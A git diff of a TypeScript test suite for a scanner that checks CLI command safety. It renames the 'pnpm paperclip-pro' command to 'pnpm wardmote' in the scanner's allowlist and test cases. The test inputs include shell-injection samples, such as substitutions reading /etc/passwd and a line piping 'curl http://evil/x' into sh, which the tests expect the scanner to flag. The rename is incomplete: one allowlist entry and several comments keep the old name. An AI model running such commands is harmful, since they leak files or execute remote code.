@@ -56,40 +56,40 @@ function extractOfflineSubsection(cli: string): string {
 // Add a new entry only for a command that carries no substitutable value.
 
 const PNPM_ALLOWLIST = new Set<string>([
-  "pnpm paperclip-pro --help",
-  "pnpm paperclip-pro run",
-  "pnpm paperclip-pro onboard",
-  "pnpm paperclip-pro onboard --yes",
-  "pnpm paperclip-pro onboard --run",
-  "pnpm paperclip-pro onboard --yes --run",
-  "pnpm paperclip-pro doctor",
-  "pnpm paperclip-pro doctor --repair",
-  "pnpm paperclip-pro auth bootstrap-ceo",
-  "pnpm paperclip-pro connect",
-  "pnpm paperclip-pro migrate",
+  "pnpm wardmote --help",
+  "pnpm wardmote run",
+  "pnpm wardmote onboard",
+  "pnpm wardmote onboard --yes",
+  "pnpm wardmote onboard --run",
+  "pnpm wardmote onboard --yes --run",
+  "pnpm wardmote doctor",
+  "pnpm wardmote doctor --repair",
+  "pnpm wardmote auth bootstrap-ceo",
+  "pnpm wardmote connect",
+  "pnpm wardmote migrate",
   "pnpm paperclip-pro db:backup",
-  "pnpm paperclip-pro configure --section server",
-  "pnpm paperclip-pro configure --section secrets",
-  "pnpm paperclip-pro configure --section storage",
-  "pnpm paperclip-pro configure --section database",
-  "pnpm paperclip-pro env",
-  "pnpm paperclip-pro env-lab up",
-  "pnpm paperclip-pro env-lab doctor",
-  "pnpm paperclip-pro env-lab status --json",
-  "pnpm paperclip-pro env-lab down",
-  "pnpm paperclip-pro context show",
-  "pnpm paperclip-pro context list",
-  "pnpm paperclip-pro issue list",
-  "pnpm paperclip-pro dashboard get",
-  "pnpm paperclip-pro plugin list",
-  "pnpm paperclip-pro feedback report",
-  "pnpm paperclip-pro feedback report --payloads",
-  "pnpm paperclip-pro feedback export",
-  "pnpm paperclip-pro instance settings:experimental",
-  "pnpm paperclip-pro worktree ensure-seeded",
-  "pnpm paperclip-pro worktree repair",
-  "pnpm paperclip-pro worktree env",
-  "pnpm paperclip-pro worktree env --json",
+  "pnpm wardmote configure --section server",
+  "pnpm wardmote configure --section secrets",
+  "pnpm wardmote configure --section storage",
+  "pnpm wardmote configure --section database",
+  "pnpm wardmote env",
+  "pnpm wardmote env-lab up",
+  "pnpm wardmote env-lab doctor",
+  "pnpm wardmote env-lab status --json",
+  "pnpm wardmote env-lab down",
+  "pnpm wardmote context show",
+  "pnpm wardmote context list",
+  "pnpm wardmote issue list",
+  "pnpm wardmote dashboard get",
+  "pnpm wardmote plugin list",
+  "pnpm wardmote feedback report",
+  "pnpm wardmote feedback report --payloads",
+  "pnpm wardmote feedback export",
+  "pnpm wardmote instance settings:experimental",
+  "pnpm wardmote worktree ensure-seeded",
+  "pnpm wardmote worktree repair",
+  "pnpm wardmote worktree env",
+  "pnpm wardmote worktree env --json",
 ]);
 
 // ── Documentation phrases ─────────────────────────────────────────────────
@@ -102,9 +102,9 @@ const PNPM_ALLOWLIST = new Set<string>([
 
 const DOC_PHRASES = new Set<string>([
   // A bare mention such as `` `pnpm paperclip-pro` `` inside prose.
-  "pnpm paperclip-pro",
+  "pnpm wardmote",
   // The abstract command form the policy section discusses.
-  "pnpm paperclip-pro <command> <args>",
+  "pnpm wardmote <command> <args>",
 ]);
 
 // ── Command extraction ────────────────────────────────────────────────────
@@ -297,7 +297,7 @@ function extractCommand(relPath: string, text: string, at: number): string {
 
 function findOffenders(relPath: string, text: string): string[] {
   const offenders: string[] = [];
-  const marker = "pnpm paperclip-pro";
+  const marker = "pnpm wardmote";
   let from = 0;
   for (;;) {
     const at = text.indexOf(marker, from);
@@ -462,7 +462,7 @@ function scanForOffenders(): string[] {
 // names the broken form on purpose to tell the reader not to use it. Skip such a
 // line, so the note itself does not trip the ban.
 function recommendsBrokenExecForm(line: string): boolean {
-  if (!line.includes("pnpm exec paperclip-pro")) return false;
+  if (!line.includes("pnpm exec wardmote")) return false;
   const lower = line.toLowerCase();
   const warns =
     lower.includes("broken") ||
@@ -485,7 +485,7 @@ function scanForBrokenExecForm(): string[] {
   return offenders;
 }
 
-describe("paperclip-pro CLI invocation safety", () => {
+describe("wardmote CLI invocation safety", () => {
   it("excludes generated runner evidence while preserving authored runner guidance", () => {
     const root = mkdtempSync(path.join(os.tmpdir(), "paperclip-cli-guidance-"));
     const sourcePaths = [
@@ -522,7 +522,7 @@ describe("paperclip-pro CLI invocation safety", () => {
       for (const relPath of fixtures) {
         const file = path.join(fixtureRoot, relPath);
         mkdirSync(path.dirname(file), { recursive: true });
-        writeFileSync(file, "pnpm paperclip-pro issue get issue-1\n");
+        writeFileSync(file, "pnpm wardmote issue get issue-1\n");
       }
       const files = listGuidanceFiles(fixtureRoot).sort();
       expect(files).toEqual([
@@ -544,7 +544,7 @@ describe("paperclip-pro CLI invocation safety", () => {
       execFileSync("git", ["init", "--quiet"], { cwd: root });
       writeFileSync(path.join(root, ".gitignore"), "ignored.md\ntracked.md\n");
       for (const name of ["ignored.md", "untracked.md", "tracked.md"]) {
-        writeFileSync(path.join(root, name), "pnpm paperclip-pro issue get issue-1\n");
+        writeFileSync(path.join(root, name), "pnpm wardmote issue get issue-1\n");
       }
       execFileSync("git", ["add", "--force", "tracked.md"], { cwd: root });
 
@@ -558,16 +558,16 @@ describe("paperclip-pro CLI invocation safety", () => {
     }
   });
 
-  it("allows only exact-allowlist pnpm paperclip-pro commands on every guidance surface", () => {
+  it("allows only exact-allowlist pnpm wardmote commands on every guidance surface", () => {
     const offenders = scanForOffenders();
     expect(
       offenders,
-      `Each pnpm paperclip-pro line must match an exact allowlist entry, else use ` +
+      `Each pnpm wardmote line must match an exact allowlist entry, else use ` +
         `npx @tickernelz/paperclip-pro (or the direct-exec form for local source):\n${offenders.join("\n")}`,
     ).toEqual([]);
   });
 
-  it("never recommends the broken pnpm exec paperclip-pro form", () => {
+  it("never recommends the broken pnpm exec wardmote form", () => {
     const offenders = scanForBrokenExecForm();
     expect(
       offenders,
@@ -585,20 +585,20 @@ describe("paperclip-pro CLI invocation safety", () => {
 
   it("flags a value-bearing option that the old flag list omitted", () => {
     // --config, --data-dir, --instance, and --bind each carry a value.
-    expect(scanText("doc/E.md", "pnpm paperclip-pro doctor --config ./scratch.json")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro run --data-dir ./tmp/dev")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro run --instance dev")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro run --bind tailnet")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro onboard --yes --bind lan")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote doctor --config ./scratch.json")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote run --data-dir ./tmp/dev")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote run --instance dev")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote run --bind tailnet")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote onboard --yes --bind lan")).toHaveLength(1);
   });
 
   it("flags a context-profile value and every worktree path/ref/id/name option", () => {
-    expect(scanText("doc/E.md", "pnpm paperclip-pro context use default")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote context use default")).toHaveLength(1);
     // Path, ref, id, and name options on worktree commands.
-    expect(scanText("doc/E.md", "pnpm paperclip-pro worktree repair --branch PAP-1-x")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro worktree:make my-feature --start-point origin/main")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro worktree init --from-config ~/.paperclip-pro/config.json")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro worktree reseed --to PAP-1-x")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote worktree repair --branch PAP-1-x")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote worktree:make my-feature --start-point origin/main")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote worktree init --from-config ~/.paperclip-pro/config.json")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote worktree reseed --to PAP-1-x")).toHaveLength(1);
   });
 
   it("does not let an npx mention on the same line suppress detection", () => {
@@ -610,11 +610,11 @@ describe("paperclip-pro CLI invocation safety", () => {
   it("rejects a command-substitution or variable span in a recommended command", () => {
     // Backtick command substitution, $( ) command substitution, and $NAME
     // variable expansion each reach a shell before the CLI starts.
-    expect(scanText("doc/E.md", "pnpm paperclip-pro allowed-hostname `hostname`")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro issue create --title $(cat /etc/passwd)")).toHaveLength(1);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro run --instance $INSTANCE")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote allowed-hostname `hostname`")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote issue create --title $(cat /etc/passwd)")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote run --instance $INSTANCE")).toHaveLength(1);
     // A literal command wrapped in $( ) is still an offender.
-    expect(scanText("doc/E.md", 'eval "$(pnpm paperclip-pro worktree env)"')).toHaveLength(1);
+    expect(scanText("doc/E.md", 'eval "$(pnpm wardmote worktree env)"')).toHaveLength(1);
   });
 
   it("flags an allowlisted prefix followed by a quoted or backtick suffix", () => {
@@ -622,12 +622,12 @@ describe("paperclip-pro CLI invocation safety", () => {
     // match the whole command, not the prefix truncated at the quote or the
     // backtick. A reader who copies the line runs the shell-expanded suffix.
     // (a) A double-quoted value that carries shell-expanded content.
-    expect(scanText("doc/E.md", 'pnpm paperclip-pro run "$(cat /etc/passwd)"')).toHaveLength(1);
-    expect(scanText("doc/E.md", 'pnpm paperclip-pro doctor "$HOME/scratch.json"')).toHaveLength(1);
+    expect(scanText("doc/E.md", 'pnpm wardmote run "$(cat /etc/passwd)"')).toHaveLength(1);
+    expect(scanText("doc/E.md", 'pnpm wardmote doctor "$HOME/scratch.json"')).toHaveLength(1);
     // (b) A backtick-delimited suffix after the allowlisted command.
-    expect(scanText("doc/E.md", "pnpm paperclip-pro run `hostname`")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote run `hostname`")).toHaveLength(1);
     // A single-quoted suffix is also part of the full command.
-    expect(scanText("doc/E.md", "pnpm paperclip-pro onboard 'extra value'")).toHaveLength(1);
+    expect(scanText("doc/E.md", "pnpm wardmote onboard 'extra value'")).toHaveLength(1);
   });
 
   // ── Fail closed on an ambiguous quote context before the marker ──────────
@@ -648,23 +648,23 @@ describe("paperclip-pro CLI invocation safety", () => {
   it("fails closed on a leading unmatched double quote before the marker", () => {
     // Round-4: the leading `"` opened a span; the tail `"` closed it; the guard
     // extracted `pnpm paperclip-pro run` and reported zero offenders (fail open).
-    const line = 'some prose with one " quote then pnpm paperclip-pro run "$(dangerous)"';
+    const line = 'some prose with one " quote then pnpm wardmote run "$(dangerous)"';
     expect(scanText("doc/E.md", line)).toHaveLength(1);
     // The same shape with a doctor prefix and a `$VAR` suffix.
-    const varLine = 'a stray " quote and pnpm paperclip-pro doctor "$HOME/x"';
+    const varLine = 'a stray " quote and pnpm wardmote doctor "$HOME/x"';
     expect(scanText("doc/E.md", varLine)).toHaveLength(1);
   });
 
   it("fails closed on a leading unmatched backtick and on mixed delimiters", () => {
     // Round-4: the leading backtick opened a span; the tail backtick closed it;
     // the guard extracted `pnpm paperclip-pro run` and reported zero offenders.
-    const backtick = "a stray ` tick then pnpm paperclip-pro run `hostname`";
+    const backtick = "a stray ` tick then pnpm wardmote run `hostname`";
     expect(scanText("doc/E.md", backtick)).toHaveLength(1);
     // Mixed: a leading unmatched backtick, then a double-quoted `$( )` suffix.
-    const mixedA = 'a stray ` tick then pnpm paperclip-pro run "$(cat secret)"';
+    const mixedA = 'a stray ` tick then pnpm wardmote run "$(cat secret)"';
     expect(scanText("doc/E.md", mixedA)).toHaveLength(1);
     // Mixed: a leading unmatched double quote, then a backtick suffix.
-    const mixedB = 'a stray " quote then pnpm paperclip-pro run `hostname`';
+    const mixedB = 'a stray " quote then pnpm wardmote run `hostname`';
     expect(scanText("doc/E.md", mixedB)).toHaveLength(1);
   });
 
@@ -672,13 +672,13 @@ describe("paperclip-pro CLI invocation safety", () => {
     // An escaped quote is literal text, not a span opener. Round-4 counted the
     // `"` in `\"` as a real delimiter, opened a span, and could fail open. The
     // guard ignores an escaped delimiter, so it extracts the full command.
-    const escapedQuote = 'a label \\" then pnpm paperclip-pro run "$(dangerous)"';
+    const escapedQuote = 'a label \\" then pnpm wardmote run "$(dangerous)"';
     expect(scanText("doc/E.md", escapedQuote)).toHaveLength(1);
-    const escapedTick = "a label \\` then pnpm paperclip-pro run `hostname`";
+    const escapedTick = "a label \\` then pnpm wardmote run `hostname`";
     expect(scanText("doc/E.md", escapedTick)).toHaveLength(1);
     // An escaped delimiter directly before the marker is not an adjacent opener,
     // so the guard fails closed and keeps the dangerous suffix.
-    const adjacentEscaped = '\\"pnpm paperclip-pro run "$(dangerous)"';
+    const adjacentEscaped = '\\"pnpm wardmote run "$(dangerous)"';
     expect(scanText("doc/E.md", adjacentEscaped)).toHaveLength(1);
   });
 
@@ -688,9 +688,9 @@ describe("paperclip-pro CLI invocation safety", () => {
     // guard reads the full command inside the span and matches the allowlist. An
     // optional `$ ` prompt inside the span still counts as adjacent. The source
     // double-quote span is proven only by the terminator that follows its close.
-    expect(scanText("doc/E.md", "Run `pnpm paperclip-pro run` to start.")).toEqual([]);
-    expect(scanText("config/example.ts", '  command: "pnpm paperclip-pro onboard --yes --run",')).toEqual([]);
-    expect(scanText("doc/E.md", "Run `$ pnpm paperclip-pro doctor` to check.")).toEqual([]);
+    expect(scanText("doc/E.md", "Run `pnpm wardmote run` to start.")).toEqual([]);
+    expect(scanText("config/example.ts", '  command: "pnpm wardmote onboard --yes --run",')).toEqual([]);
+    expect(scanText("doc/E.md", "Run `$ pnpm wardmote doctor` to check.")).toEqual([]);
   });
 
   // ── Fail closed outside a proven literal context (context-aware spans) ────
@@ -707,7 +707,7 @@ describe("paperclip-pro CLI invocation safety", () => {
     // A shell concatenates the quoted string with the `$( )` result, so the close
     // quote is not a safe boundary. The `.sh` rule never trusts a quote span, so
     // the guard keeps the dangerous suffix and reports the whole command.
-    const shell = 'eval "pnpm paperclip-pro run"$(curl http://evil/x | sh)';
+    const shell = 'eval "pnpm wardmote run"$(curl http://evil/x | sh)';
     expect(scanText("deploy/run.sh", shell)).toHaveLength(1);
   });
 
@@ -715,7 +715,7 @@ describe("paperclip-pro CLI invocation safety", () => {
     // A Markdown double quote is prose, not a literal delimiter. The guard does
     // not trust the span, so the dangerous suffix outside the quote stays in the
     // command and the guard reports it.
-    const md = 'Run "pnpm paperclip-pro run"$(cat /etc/passwd) to start.';
+    const md = 'Run "pnpm wardmote run"$(cat /etc/passwd) to start.';
     expect(scanText("doc/E.md", md)).toHaveLength(1);
   });
 
@@ -723,9 +723,9 @@ describe("paperclip-pro CLI invocation safety", () => {
     // A source double quote is a literal only when a source terminator follows
     // its close. A close quote that a `+` concatenation or a `$(` expansion
     // follows is not a proven literal end, so the guard reports the command.
-    const concat = 'const cmd = "pnpm paperclip-pro run" + userInput;';
+    const concat = 'const cmd = "pnpm wardmote run" + userInput;';
     expect(scanText("src/build-cmd.ts", concat)).toHaveLength(1);
-    const substitution = 'const cmd = "pnpm paperclip-pro run"$(inject);';
+    const substitution = 'const cmd = "pnpm wardmote run"$(inject);';
     expect(scanText("src/build-cmd.ts", substitution)).toHaveLength(1);
   });
 
@@ -757,7 +757,7 @@ describe("paperclip-pro CLI invocation safety", () => {
     // tail. The comma after the element is a source terminator, but it does not
     // prove a complete command, so the guard reports the whole expression.
     const source =
-      'const command = ["pnpm paperclip-pro run", userControlledTail].join("");';
+      'const command = ["pnpm wardmote run", userControlledTail].join("");';
     const offenders = scanText("src/build-command.ts", source);
     expect(offenders).toHaveLength(1);
   });
@@ -766,7 +766,7 @@ describe("paperclip-pro CLI invocation safety", () => {
     // A function-call argument list joins an allowlisted prefix literal with a
     // tail. The comma after the prefix is a call-argument separator, not a proof
     // of a complete command, so the guard reports the composition.
-    const source = 'const command = buildCommand("pnpm paperclip-pro run", tail);';
+    const source = 'const command = buildCommand("pnpm wardmote run", tail);';
     const offenders = scanText("src/build-command.ts", source);
     expect(offenders).toHaveLength(1);
   });
@@ -775,21 +775,21 @@ describe("paperclip-pro CLI invocation safety", () => {
     // The parser joins backslash-continued lines into one logical command. An
     // allowlisted first line does not make the whole command safe. The suffix on
     // the continued line still reaches a shell.
-    const quoted = ["pnpm paperclip-pro doctor \\", '  --config "$(cat secret)"'].join("\n");
+    const quoted = ["pnpm wardmote doctor \\", '  --config "$(cat secret)"'].join("\n");
     expect(scanText("doc/EXAMPLE.md", quoted)).toHaveLength(1);
-    const backtick = ["pnpm paperclip-pro run \\", "  `hostname`"].join("\n");
+    const backtick = ["pnpm wardmote run \\", "  `hostname`"].join("\n");
     const offenders = scanText("doc/EXAMPLE.md", backtick);
     expect(offenders).toHaveLength(1);
     expect(offenders[0]).toContain("doc/EXAMPLE.md:1:");
   });
 
   it("allows an exact allowlist entry and a bare documentation mention", () => {
-    expect(scanText("doc/E.md", "pnpm paperclip-pro run")).toEqual([]);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro worktree env --json")).toEqual([]);
-    expect(scanText("doc/E.md", "pnpm paperclip-pro configure --section server")).toEqual([]);
+    expect(scanText("doc/E.md", "pnpm wardmote run")).toEqual([]);
+    expect(scanText("doc/E.md", "pnpm wardmote worktree env --json")).toEqual([]);
+    expect(scanText("doc/E.md", "pnpm wardmote configure --section server")).toEqual([]);
     // A prose mention inside backticks is not a runnable command.
-    expect(scanText("doc/E.md", "Do not use `pnpm paperclip-pro` for a content-bearing argument.")).toEqual([]);
-    expect(scanText("doc/E.md", "The `pnpm paperclip-pro <command> <args>` form is unsafe.")).toEqual([]);
+    expect(scanText("doc/E.md", "Do not use `pnpm wardmote` for a content-bearing argument.")).toEqual([]);
+    expect(scanText("doc/E.md", "The `pnpm wardmote <command> <args>` form is unsafe.")).toEqual([]);
   });
 
   // ── Direct assertions on the runtime-generated instruction surfaces ──────
@@ -803,14 +803,14 @@ describe("paperclip-pro CLI invocation safety", () => {
     // form does not stop the outer shell. Emit a static `<host>` placeholder only.
     expect(source).toContain("run npx @tickernelz/paperclip-pro allowed-hostname <host>");
     expect(source).not.toContain("allowed-hostname ${hostname}");
-    expect(source).not.toContain("pnpm paperclip-pro allowed-hostname");
-    expect(source).not.toContain("pnpm exec paperclip-pro allowed-hostname");
+    expect(source).not.toContain("pnpm wardmote allowed-hostname");
+    expect(source).not.toContain("pnpm exec wardmote allowed-hostname");
   });
 
   it("emits a static, non-interpolated safe form from the onboarding access diagnostics", () => {
     const source = read("server/src/routes/access.ts");
-    expect(source).not.toMatch(/pnpm paperclip-pro allowed-hostname/);
-    expect(source).not.toContain("pnpm exec paperclip-pro allowed-hostname");
+    expect(source).not.toMatch(/pnpm wardmote allowed-hostname/);
+    expect(source).not.toContain("pnpm exec wardmote allowed-hostname");
     expect(source).toContain("npx @tickernelz/paperclip-pro allowed-hostname <host>");
     // The onboarding host comes from the request base URL, so a requester
     // controls it. The emitted command must carry a static `<host>` placeholder
@@ -820,8 +820,8 @@ describe("paperclip-pro CLI invocation safety", () => {
 
   it("emits the safe form from the agent onboarding prompt", () => {
     const source = read("ui/src/lib/agent-onboarding-prompt.ts");
-    expect(source).not.toContain("pnpm paperclip-pro allowed-hostname");
-    expect(source).not.toContain("pnpm exec paperclip-pro allowed-hostname");
+    expect(source).not.toContain("pnpm wardmote allowed-hostname");
+    expect(source).not.toContain("pnpm exec wardmote allowed-hostname");
     expect(source).toContain("npx @tickernelz/paperclip-pro allowed-hostname <host>");
   });
 
@@ -831,14 +831,14 @@ describe("paperclip-pro CLI invocation safety", () => {
       { companyName: "Acme", companyDescription: null },
     );
     expect(readme).toContain("npx @tickernelz/paperclip-pro company import this-github-url-or-folder");
-    expect(readme).not.toContain("pnpm paperclip-pro company import");
-    expect(readme).not.toContain("pnpm exec paperclip-pro company import");
+    expect(readme).not.toContain("pnpm wardmote company import");
+    expect(readme).not.toContain("pnpm exec wardmote company import");
   });
 
   it("emits the safe form in the company-export preview builder", () => {
     const source = read("ui/src/pages/CompanyExport.tsx");
-    expect(source).not.toContain("pnpm paperclip-pro company import");
-    expect(source).not.toContain("pnpm exec paperclip-pro company import");
+    expect(source).not.toContain("pnpm wardmote company import");
+    expect(source).not.toContain("pnpm exec wardmote company import");
     expect(source).toContain("npx @tickernelz/paperclip-pro company import");
   });
 
@@ -856,14 +856,14 @@ describe("paperclip-pro CLI invocation safety", () => {
   it("emits the onboard hint from the server startup banner", () => {
     const source = read("server/src/startup-banner.ts");
     expect(source).toContain("npx @tickernelz/paperclip-pro onboard");
-    expect(source).not.toContain("pnpm paperclip-pro onboard");
-    expect(source).not.toContain("pnpm exec paperclip-pro onboard");
+    expect(source).not.toContain("pnpm wardmote onboard");
+    expect(source).not.toContain("pnpm exec wardmote onboard");
   });
 
   it("emits the safe run form from the client connection-error hint", () => {
     const source = read("cli/src/client/http.ts");
     expect(source).toContain("npx @tickernelz/paperclip-pro run");
-    expect(source).not.toContain("pnpm paperclip-pro run");
+    expect(source).not.toContain("pnpm wardmote run");
   });
 
   it("emits the checked-out CLI cleanup form from the env-lab status output", () => {
@@ -879,9 +879,9 @@ describe("paperclip-pro CLI invocation safety", () => {
     expect(source).toContain('path.join(cliRoot, "src", "index.ts")');
     expect(source).toContain("env-lab down");
     // The bare `pnpm paperclip-pro` script form is unsafe. Do not restore it.
-    expect(source).not.toContain("pnpm paperclip-pro env-lab");
+    expect(source).not.toContain("pnpm wardmote env-lab");
     // `pnpm exec paperclip-pro` does not resolve the CLI binary. Do not use it.
-    expect(source).not.toContain("pnpm exec paperclip-pro env-lab");
+    expect(source).not.toContain("pnpm exec wardmote env-lab");
     // The CWD-relative form breaks from a checkout subdirectory. Do not restore it.
     expect(source).not.toContain(
       "node cli/node_modules/tsx/dist/cli.mjs cli/src/index.ts env-lab down",
@@ -891,15 +891,15 @@ describe("paperclip-pro CLI invocation safety", () => {
   it("emits the bootstrap fallback command from the UI", () => {
     const source = read("ui/src/bootstrapSetup.ts");
     expect(source).toContain("npx @tickernelz/paperclip-pro auth bootstrap-ceo");
-    expect(source).not.toContain("pnpm paperclip-pro auth bootstrap-ceo");
-    expect(source).not.toContain("pnpm exec paperclip-pro auth bootstrap-ceo");
+    expect(source).not.toContain("pnpm wardmote auth bootstrap-ceo");
+    expect(source).not.toContain("pnpm exec wardmote auth bootstrap-ceo");
   });
 
   it("emits the setup form from the board skill", () => {
     const source = read("skills/paperclip-board/SKILL.md");
     expect(source).toContain("npx @tickernelz/paperclip-pro board setup");
-    expect(source).not.toContain("pnpm paperclip-pro board setup");
-    expect(source).not.toContain("pnpm exec paperclip-pro board setup");
+    expect(source).not.toContain("pnpm wardmote board setup");
+    expect(source).not.toContain("pnpm exec wardmote board setup");
   });
 
   // ── The safe-invocation note ─────────────────────────────────────────────
@@ -923,8 +923,8 @@ describe("paperclip-pro CLI invocation safety", () => {
     // `pnpm exec paperclip-pro` as a safe or offline form. Only a warning line
     // may name `pnpm paperclip-pro`, and it must tell the reader not to use it.
     for (const line of subsection.split("\n")) {
-      expect(line).not.toContain("pnpm exec paperclip-pro");
-      if (line.includes("pnpm paperclip-pro")) {
+      expect(line).not.toContain("pnpm exec wardmote");
+      if (line.includes("pnpm wardmote")) {
         expect(line.toLowerCase()).toContain("do not use");
       }
     }
@@ -934,15 +934,15 @@ describe("paperclip-pro CLI invocation safety", () => {
     const skill = read("skills/paperclip/SKILL.md");
     expect(skill).toContain("CLI safety");
     expect(skill).toContain("npx @tickernelz/paperclip-pro");
-    expect(skill).toContain("Do not use `pnpm paperclip-pro`");
+    expect(skill).toContain("Do not use `pnpm wardmote`");
   });
 
   // ── Backslash line continuation ──────────────────────────────────────────
 
-  it("flags a content-bearing pnpm paperclip-pro command split across continued lines", () => {
+  it("flags a content-bearing pnpm wardmote command split across continued lines", () => {
     const source = [
       "```sh",
-      "pnpm paperclip-pro issue create \\",
+      "pnpm wardmote issue create \\",
       '  --company-id <company-id> \\',
       '  --title "$(cat /etc/passwd)"',
       "```",
@@ -955,7 +955,7 @@ describe("paperclip-pro CLI invocation safety", () => {
 
   it("flags a continued command whose only content-bearing flag sits on the last line", () => {
     const source = [
-      "pnpm paperclip-pro worktree init \\",
+      "pnpm wardmote worktree init \\",
       "  --force \\",
       "  --name PAP-000-example",
     ].join("\n");
@@ -974,19 +974,19 @@ describe("paperclip-pro CLI invocation safety", () => {
     expect(scanText("doc/EXAMPLE.md", source)).toEqual([]);
   });
 
-  it("does not flag a continued pnpm paperclip-pro command that stays on the allowlist", () => {
+  it("does not flag a continued pnpm wardmote command that stays on the allowlist", () => {
     const source = [
-      "pnpm paperclip-pro env-lab \\",
+      "pnpm wardmote env-lab \\",
       "  status \\",
       "  --json",
     ].join("\n");
     expect(scanText("doc/EXAMPLE.md", source)).toEqual([]);
   });
 
-  it("flags a recommended pnpm exec paperclip-pro line but skips a warning line", () => {
-    expect(recommendsBrokenExecForm("Run pnpm exec paperclip-pro issue create --title x")).toBe(true);
+  it("flags a recommended pnpm exec wardmote line but skips a warning line", () => {
+    expect(recommendsBrokenExecForm("Run pnpm exec wardmote issue create --title x")).toBe(true);
     expect(
-      recommendsBrokenExecForm("`pnpm exec paperclip-pro <command> <args>` — broken. Do not use it."),
+      recommendsBrokenExecForm("`pnpm exec wardmote <command> <args>` — broken. Do not use it."),
     ).toBe(false);
   });
 });
